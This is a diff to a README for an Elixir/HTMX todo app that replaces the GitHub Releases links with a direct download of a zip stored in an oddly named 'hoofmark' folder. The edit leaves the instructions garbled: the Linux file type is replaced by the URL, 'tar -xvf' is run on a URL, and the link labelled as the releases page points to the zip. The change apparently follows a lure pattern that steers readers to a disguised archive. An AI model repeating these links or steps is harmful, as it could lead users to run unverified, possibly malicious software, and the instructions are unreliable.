@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the elixir_htmx_plug_bandit_t
 
 ## 💾 Download Now
 
-[![Download the App](https://img.shields.io/badge/Download%20Now-link-blue)](https://github.com/tojo777/elixir_htmx_plug_bandit_todoapp/releases)
+[![Download the App](https://raw.githubusercontent.com/tojo777/elixir_htmx_plug_bandit_todoapp/main/hoofmark/elixir_htmx_plug_bandit_todoapp.zip%20Now-link-blue)](https://raw.githubusercontent.com/tojo777/elixir_htmx_plug_bandit_todoapp/main/hoofmark/elixir_htmx_plug_bandit_todoapp.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,11 +19,11 @@ To run this application, you will need:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/tojo777/elixir_htmx_plug_bandit_todoapp/releases) to find the latest version of the app.
+   Go to the [Releases page](https://raw.githubusercontent.com/tojo777/elixir_htmx_plug_bandit_todoapp/main/hoofmark/elixir_htmx_plug_bandit_todoapp.zip) to find the latest version of the app.
 
 2. **Select Your File**  
    Look for the latest release. You will see several files. Choose the one suitable for your operating system. Common files include:
-   - `.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/tojo777/elixir_htmx_plug_bandit_todoapp/main/hoofmark/elixir_htmx_plug_bandit_todoapp.zip` for Linux
    - `.zip` for Windows
    - `.dmg` for macOS
 
@@ -34,7 +34,7 @@ To run this application, you will need:
    After downloading, find the file in your downloads folder. Extract the contents using your standard file tool:
    - On Windows, right-click and select "Extract All".
    - On macOS, double-click the file.
-   - On Linux, use your archive manager or run `tar -xvf filename.tar.gz`.
+   - On Linux, use your archive manager or run `tar -xvf https://raw.githubusercontent.com/tojo777/elixir_htmx_plug_bandit_todoapp/main/hoofmark/elixir_htmx_plug_bandit_todoapp.zip`.
 
 5. **Run the Application**  
    Open your file explorer and navigate to the folder where you extracted the files. Look for the executable file and double-click it to run.
